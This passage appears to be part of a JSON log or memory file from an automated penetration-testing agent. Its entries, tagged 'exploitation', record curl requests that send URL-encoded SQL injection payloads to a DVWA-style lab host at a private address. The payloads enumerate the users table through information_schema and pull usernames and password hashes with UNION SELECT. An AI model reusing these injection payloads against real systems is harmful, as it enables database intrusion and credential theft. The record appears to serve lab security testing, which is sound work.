+      "age_s": 67760.69743824005,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:e0a9d3da4a0f",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 67685.24974632263,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:635c1dae4602",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 67593.41883921623,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:56a993ebe875",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 67564.44794774055,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:566d357d06b9",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 1703.0515892505646,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:a07fabc03c53",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 1553.4920749664307,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:f75a42e6e77e",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 1449.6961226463318,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:89472b75ab7f",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 0.003160238265991211,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    }
+  ],
+  "metrics": {
+    "ok": true,
+    "tool_calls": 0,
+    "tool_failures": 0,
+    "guardrail_blocks": 0,
+    "extraction_fallbacks": 0,
+    "tokens_total": 36465
+  }
+}
